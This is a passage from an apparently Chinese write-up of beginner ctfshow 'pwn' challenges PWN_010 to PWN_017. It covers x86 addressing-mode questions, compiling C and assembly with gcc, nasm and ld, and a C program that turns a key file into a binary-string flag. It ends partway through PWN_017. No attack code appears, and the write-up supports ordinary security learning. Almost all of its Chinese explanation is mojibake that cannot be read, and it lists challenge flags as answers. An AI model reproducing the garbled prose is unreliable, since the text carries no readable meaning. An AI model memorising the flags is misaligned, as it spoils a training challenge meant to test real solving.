	
		class="gallery-image" 
		data-flex-grow="700"
		data-flex-basis="1680px"
	
></p>
<p>ä¹Ÿå°±æ˜¯è¿™é‡Œå°†msgçš„åœ°å€ï¼ˆ0x80490E8ï¼‰+ 4 å¤„æ‰€æ‰§å‘çš„åœ°å€çš„å€¼èµ‹ç»™eax</p>
<p>4æ˜¯åè¿›åˆ¶çš„ï¼Œåœ°å€æ˜¯16è¿›åˆ¶çš„ï¼Œè®°å¾—è½¬æ¢ä¸€ä¸‹ï¼š</p>
<p>hex(0x80490E8+4)&ndash;&gt; 080490EC</p>
<p>å¯¹åº”åœ°å€å¾—å€¼æ˜¯ome_to_CTFshow_PWN</p>
<p>æ•…flag:ctfshow{ome_to_CTFshow_PWN}</p>
<h3 id="pwn_011">PWN_011
</h3><p>é¢˜ç›®ï¼š<strong>åŸºå€å˜å€å¯»å€</strong>æ–¹å¼ç»“æŸåçš„eaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_011%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_011%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; åŸºå€å˜å€å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">2</span>          <span class="c1">; å°†2èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>  <span class="c1">; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŒæ ·çš„ï¼Œæ”¾åˆ°IDAä¸Šæ‰¾è¿™ä¸ªåŸºå€å˜å€å¯»å€æ–¹å¼ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/30.png"
	width="780"
	height="60"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/30_hu_901c17825a17f8ed.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/30_hu_668a6173f2e3ecb2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1300"
		data-flex-basis="3120px"
	
></p>
<p>åŒå‡»ç‚¹dwordå»è·Ÿè¿›åˆ°åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/31.png"
	width="820"
	height="135"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/31_hu_15a7389171b58f28.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/31_hu_750b9884b38e7964.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="607"
		data-flex-basis="1457px"
	
></p>
<p>è®¡ç®—æœ€ç»ˆä¹Ÿæ˜¯ [0x80490E8 + 2*2 ] = [0X80490EC]</p>
<p>å…¶å®ä¹Ÿæ˜¯å’ŒPWN_010ä¸€æ ·ï¼šhex(0x80490E8+4)</p>
<p>å°±æ˜¯è¯´hex(0x80490E8 + 2*2 )=0X80490ECï¼Œå¯¹åº”çš„æ˜¯â€œome_to_CTFshow_PWNâ€ã€‚</p>
<p>flagï¼šctfshow{ome_to_CTFshow_PWN}</p>
<h3 id="pwn_012">PWN_012
</h3><p>é¢˜ç›®ï¼šç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ</p>
<p><a class="link" href="PWN_012%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_012%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; å°†1èµ‹å€¼ç»™edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">8</span>          <span class="c1">; å°†ecxåŠ ä¸Š8</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">6</span><span class="p">]</span>  <span class="c1">; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/32.png"
	width="770"
	height="164"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/32_hu_99e9e101810244d0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/32_hu_f807a9c980e1f370.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="469"
		data-flex-basis="1126px"
	
></p>
<p>è·Ÿè¿›offset dword_80490E8ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/33.png"
	width="856"
	height="105"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/33_hu_3157e877f3a9f1c1.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/33_hu_77b09f0915eccfa5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="815"
		data-flex-basis="1956px"
	
></p>
<p>é‚£å°±æ˜¯ï¼š[8 + 0x80490E8 + 1*2 - 6] = [0x80490EC]</p>
<p>æ•…flag:ctfshow{ome_to_CTFshow_PWN}</p>
<h3 id="pwn_013">PWN_013
</h3><p>é¢˜ç›®ï¼šå¦‚ä½•ä½¿ç”¨GCCï¼Ÿç¼–è¯‘è¿è¡Œåå³å¯è·å¾—flag  <a class="link" href="PWN_013%5cPWN_013.c" >PWN_013.c</a></p>
<p>å­¦è¿‡Cè¯­è¨€éƒ½ä¼šå®‰è£…é…ç½®ç¼–è¯‘å™¨ç¯å¢ƒçš„ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯<strong>visual-studio-code</strong>ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/34.png"
	width="1534"
	height="466"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/34_hu_a2d59cd0ef0b2014.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/34_hu_a654e108c81c213e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="329"
		data-flex-basis="790px"
	
></p>
<p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„ C ç¨‹åºï¼Œå®ƒä½¿ç”¨å­—ç¬¦æ•°ç»„ flag å­˜å‚¨äº†ä¸€ä¸ªåŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œå¹¶é€šè¿‡ printfå‡½æ•°å°†å…¶æ‰“å°å‡ºæ¥ã€‚</p>
<p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ flag æ•°ç»„å­˜å‚¨äº†ä¸€ä¸²æ•´æ•°å€¼ï¼Œè¿™äº›æ•´æ•°å€¼ä»£è¡¨äº†å­—ç¬¦çš„ ASCII ç ã€‚é€šè¿‡å°†è¿™äº›æ•´æ•°å€¼è½¬æ¢ä¸ºç›¸åº”çš„å­—ç¬¦ï¼Œå°±å¯ä»¥è¿˜åŸå‡ºåŸå§‹çš„å­—ç¬¦ä¸²ã€‚</p>
<p>è¿è¡Œè¯¥ç¨‹åºï¼Œ printf å‡½æ•°ä½¿ç”¨ %s æ ¼å¼å­—ç¬¦ä¸²å°† flag æ•°ç»„ä½œä¸ºå‚æ•°è¿›è¡Œæ‰“å°ã€‚ç”±äº flag æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ä¸ºé›¶ï¼ˆNULL å­—ç¬¦ï¼‰ï¼Œ printf å‡½æ•°ä¼šå°†å…¶ä¹‹å‰çš„å­—ç¬¦ä¾æ¬¡æ‰“å°ï¼Œç›´åˆ°é‡åˆ° NULL å­—ç¬¦ä¸ºæ­¢ã€‚æ ¹æ®ç»™å®šçš„æ•´æ•°å€¼æ•°ç»„ï¼Œè¿˜åŸå‡ºçš„å­—ç¬¦ä¸²ä¸ºï¼š ctfshow{hOw_t0_us3_GCC?} ã€‚</p>
<h3 id="pwn_014">PWN_014
</h3><p>é¢˜ç›®ï¼šè¯·ä½ é˜…è¯»ä»¥ä¸‹æºç ï¼Œ<strong>ç»™å®škeyä¸ºâ€CTFshowâ€</strong>ï¼Œç¼–è¯‘è¿è¡Œå³å¯è·å¾—flagã€‚ <a class="link" href="PWN_014%5cPWN_014.c" >PWN_014.c</a></p>
<p>è¿™ä¸ªæ–‡ä»¶æœ‰å¼ºåº¦äº†ï¼Œç›´æ¥ç¼–è¯‘è¿è¡Œä¼šè¯´nothing is hereï¼Œä¸ç»™flagï¼Œå…ˆè¯»ä¸€ä¸‹è¿™ä¸ªCè¯­è¨€æ–‡ä»¶åœ¨å¹²ä»€ä¹ˆçš„ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>                  <span class="c1">// æ–‡ä»¶æŒ‡é’ˆï¼Œç”¨äºæ“ä½œæ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>  <span class="c1">// ç¼“å†²åŒºï¼Œå­˜å‚¨ä»æ–‡ä»¶è¯»å–çš„äºŒè¿›åˆ¶æ•°æ®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span>                  <span class="c1">// è®°å½•æ¯æ¬¡å®é™…è¯»å–çš„å­—èŠ‚æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>   <span class="c1">// ä»¥äºŒè¿›åˆ¶åªè¯»æ–¹å¼æ‰“å¼€åä¸º &#34;key&#34; çš„æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Nothing here!&#34;</span><span class="p">);</span>  <span class="c1">// è‹¥æ‰“å¼€å¤±è´¥ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// è¾“å‡ºç¼“å†²åŒºï¼šå¤§å°ä¸º BUFFER_SIZE*9 + 12ï¼ˆé¢„ç•™è¶³å¤Ÿç©ºé—´å­˜å‚¨äºŒè¿›åˆ¶å­—ç¬¦ä¸²å’Œåˆ†éš”ç¬¦ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="n">output</span><span class="p">[</span><span class="n">BUFFER_SIZE</span> <span class="o">*</span> <span class="mi">9</span> <span class="o">+</span> <span class="mi">12</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// è®°å½• output ä¸­å½“å‰å·²ä½¿ç”¨çš„ä½ç½®ï¼ˆåç§»é‡ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// å…ˆåœ¨ output å¼€å¤´å†™å…¥ &#34;ctfshow{&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;ctfshow{&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// å¾ªç¯è¯»å–æ–‡ä»¶å†…å®¹ï¼šæ¯æ¬¡æœ€å¤šè¯» BUFFER_SIZE å­—èŠ‚ï¼Œç›´åˆ°æ–‡ä»¶ç»“æŸ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span> <span class="p">((</span><span class="n">n</span> <span class="o">=</span> <span class="nf">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">),</span> <span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="n">fp</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// éå†æœ¬æ¬¡è¯»å–çš„æ¯ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// å°†å½“å‰å­—èŠ‚æ‹†åˆ†ä¸º 8 ä½äºŒè¿›åˆ¶ï¼ˆä»é«˜ä½åˆ°ä½ä½ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// (buffer[i] &gt;&gt; j) &amp; 1ï¼šè·å–ç¬¬ j ä½ï¼ˆ0 æˆ– 1ï¼‰ï¼Œå¹¶å†™å…¥ output
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// é™¤äº†æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œæ¯ä¸ªå­—èŠ‚çš„äºŒè¿›åˆ¶ååŠ ä¸‹åˆ’çº¿ &#34;_&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;_&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// è‹¥æœªåˆ°æ–‡ä»¶æœ«å°¾ï¼Œåœ¨æœ¬æ¬¡ç¼“å†²åŒºæ•°æ®ååŠ ç©ºæ ¼ &#34; &#34;ï¼ˆåˆ†éš”ä¸åŒæ‰¹æ¬¡çš„è¯»å–ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">feof</span><span class="p">(</span><span class="n">fp</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// åœ¨ output æœ«å°¾å†™å…¥ &#34;}&#34;ï¼Œå®Œæˆæ ¼å¼åŒ…è£¹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// æ‰“å°æœ€ç»ˆç”Ÿæˆçš„å­—ç¬¦ä¸²
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>  <span class="c1">// å…³é—­æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåä¸ºkeyçš„æ–‡ä»¶ï¼Œè®©è¿™ä¸ªç¨‹åºçŸ¥é“ï¼Œç„¶åä»–å°±èƒ½æŠŠflagå­—ç¬¦ä¸²åå‡ºæ¥äº†ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;CTFshow&#34;</span>&gt; key  <span class="c1">#åˆ›å»ºä¸€ä¸ªåä¸ºkeyå¾—æ–‡ä»¶ï¼Œå‘å†…è¾“å…¥â€œCTFshowâ€çš„å­—ç¬¦ä¸²</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/35.png"
	width="1145"
	height="336"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/35_hu_df60cb17ad88303e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/35_hu_aca6ec48c69a455b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="340"
		data-flex-basis="817px"
	
></p>
<p>ç­”æ¡ˆæ˜¯ctfshow{01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010}</p>
<p>é¢˜ç›®è¦æ±‚åœ¨keyé‡ŒåŠ CTFshowå­—ç¬¦ä¸²ï¼ŒåŠ å…¶å®ƒæ˜¯é”™çš„ï¼Œè¾“å‡ºç»“æœä¸åŒã€‚</p>
<h3 id="pwn_015">PWN_015
</h3><p>é¢˜ç›®ï¼šç¼–è¯‘æ±‡ç¼–ä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³å¯æ‹¿åˆ°flagã€‚ <a class="link" href="PWN_015%5cflag.asm" >flag.asm</a></p>
<p>æ±‡ç¼–è½¬æ¢ï¼šå°† .asm è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf flag.asm
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ±‡ç¼–ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld -m elf_i386 -s -o flag1 flag.o
</span></span></code></pre></td></tr></table>
</div>
</div><p>ï¼ˆflag1æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/36.png"
	width="624"
	height="165"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/36_hu_fda5333d80d87b82.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/36_hu_4d6103555c03c502.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="378"
		data-flex-basis="907px"
	
></p>
<p>æ¯”è¾ƒç®€å•ï¼Œå’Œ<a class="link" href="https://expl0rer.top/p/ctfshow-pwn-writeup/#pwn_005"  target="_blank" rel="noopener"
    >PWN_005</a>å¾ˆç±»ä¼¼ï¼Œéƒ½æ˜¯æ±‡ç¼–è¯­è¨€ç¼–è¯‘è¿è¡Œä¹‹ç±»çš„ã€‚</p>
<p>ctfshow{@ss3mb1y_1s_3@sy}</p>
<h3 id="pwn_016">PWN_016
</h3><p>é¢˜ç›®ï¼šä½¿ç”¨gccå°†å…¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚ <a class="link" href="PWN_016%5cflag.s" >flag.s</a></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/37.png"
	width="646"
	height="104"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/37_hu_b3e8aef3e1ef05a0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/37_hu_af79549354799dd4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="621"
		data-flex-basis="1490px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc flag.s -o flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥ä½¿ç”¨ gcc å‘½ä»¤ç›´æ¥ç¼–è¯‘æ±‡ç¼–è¯­è¨€æºæ–‡ä»¶ï¼ˆ .s æ–‡ä»¶ï¼‰å¹¶å°†å…¶é“¾æ¥ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚ gcc å‘½ä»¤å…·æœ‰é€‚ç”¨äºå¤šç§è¯­è¨€çš„ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºåŠŸèƒ½ï¼Œå®ƒå¯ä»¥æ ¹æ®è¾“å…¥æ–‡ä»¶çš„æ‰©å±•åè‡ªåŠ¨é€‰æ‹©é€‚å½“çš„ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨ã€‚</p>
<p>æ•…flagï¼šctfshow{daniuniuda}</p>
<h3 id="pwn_017">PWN_017
</h3><p>é¢˜ç›®ï¼šæœ‰äº›å‘½ä»¤å¥½åƒæœ‰ç‚¹ä¸ä¸€æ ·ï¼Ÿä¸è¦ä¸€ç›´ç­‰ï¼Œå¯èƒ½é‚£æ ·æ°¸è¿œä¹Ÿç­‰ä¸åˆ°flagã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/38.png"
	width="930"
	height="325"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/38_hu_7d79a6ffed12bd13.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/38_hu_bffb150ab5d0f0e3.png 1024w"
	loading="lazy"
	
		alt="è¿›ç¨‹3"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="686px"
	
></p>
<p>æ¯”è¾ƒå¥‡è‘©çš„æ˜¯ï¼Œè¿™é‡Œé€‰æ‹©3çš„è¯ï¼Œä¸€ç›´åœ¨loadingçš„ï¼Œå¯èƒ½æ˜¯ä¸é€šçš„ï¼Œæˆ‘æ¢åˆ°ä¸»æœºçš„ncä¹Ÿä¸è¡Œï¼Œé‚£å°±æ˜¯é€‰2è¿›ç¨‹çš„</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/39.png"
	width="879"
	height="536"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/39_hu_feeea272629e1334.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/39_hu_cc955cd53b60ba21.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="163"
		data-flex-basis="393px"
	
></p>
<p>é€‰äº†2åï¼Œç¨‹åºå¼€å§‹å‘ç™«äº†&hellip;.ï¼Œä¸€ç›´å¾ªç¯æå¾—æˆ‘Kaliè™šæ‹Ÿæœºå¡æ­»äº†ï¼Œè¿›åˆ°IDAx64å»çœ‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/40.png"
	width="1160"
	height="423"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/40_hu_4ec1173fad870b57.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/40_hu_9873e66f0cb6080d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
